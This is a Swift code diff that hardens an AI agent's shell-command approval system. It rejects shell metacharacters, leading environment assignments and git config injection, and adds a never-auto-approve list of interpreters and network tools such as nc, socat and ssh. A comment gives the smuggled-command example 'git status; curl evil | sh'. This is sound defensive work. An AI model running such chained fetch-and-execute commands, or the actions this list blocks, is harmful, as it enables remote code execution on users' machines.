@@ -115,20 +115,41 @@ public actor RunShellPermissions {
         UserDefaults.standard.set(Array(globalAllowed), forKey: Self.defaultsKey)
     }
 
-    /// Best-effort extraction of the actual command being run, from a
-    /// `run_shell` call's `command` argument — the first token that isn't a
-    /// leading `VAR=value` environment assignment, with any path stripped
-    /// (`/usr/bin/git` and `git` should be the same permission entry).
-    /// Deliberately simple: good enough for the common case, not a shell
-    /// parser — a command hidden behind `bash -c "..."` or a pipeline just
-    /// resolves to "bash", which is still a meaningful (if coarse) unit to
-    /// grant trust to.
+    /// Shell metacharacters that let one approved-looking command smuggle in
+    /// another (`git status; curl evil | sh`, `$(…)`, redirections, newlines).
+    private static let shellMetacharacters = CharacterSet(charactersIn: ";|&$`()<>\n\r{}\\")
+
+    /// Binaries that run arbitrary other commands or code, so trusting the
+    /// name is trusting anything — they are never eligible for a per-binary
+    /// "always allow".
+    static let neverAutoApprove: Set<String> = [
+        "bash", "sh", "zsh", "dash", "ksh", "fish", "env", "xargs", "sudo", "su", "doas", "eval", "exec",
+        "nohup", "timeout", "time", "nice", "watch", "python", "python3", "node", "perl", "ruby", "php",
+        "lua", "awk", "gawk", "find", "ssh", "scp", "nc", "ncat", "socat", "busybox", "chroot", "script",
+    ]
+
+    /// Extracts the binary a per-binary "always allow" grant would apply to,
+    /// or `nil` when this command isn't safe to reduce to one name: it
+    /// contains shell metacharacters (chaining/substitution/redirection), the
+    /// binary is a general-purpose interpreter/launcher, or it passes `-c`
+    /// style config injection (`git -c core.pager=…`). `nil` means "always
+    /// ask" — never "auto-approve".
+    ///
+    /// The first token that isn't a leading `VAR=value` assignment is the
+    /// binary (path stripped: `/usr/bin/git` and `git` are the same entry).
     public static func extractBinary(fromCommand command: String) -> String? {
+        if command.rangeOfCharacter(from: shellMetacharacters) != nil { return nil }
         var tokens = command.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
-        while let first = tokens.first, first.contains("="), !first.hasPrefix("-") {
-            tokens.removeFirst()
-        }
+        // Leading env assignments (`LD_PRELOAD=… ls`) change what a binary
+        // does entirely, so a command that starts with one isn't reducible.
+        if let first = tokens.first, first.contains("="), !first.hasPrefix("-") { return nil }
         guard let first = tokens.first, !first.isEmpty else { return nil }
-        return (first as NSString).lastPathComponent
+        let binary = (first as NSString).lastPathComponent
+        guard !neverAutoApprove.contains(binary) else { return nil }
+        if binary == "git", tokens.dropFirst().contains(where: { $0 == "-c" || $0.hasPrefix("--exec-path") || $0.hasPrefix("--config-env") }) {
+            return nil
+        }
+        _ = tokens.removeFirst()
+        return binary
     }
 }
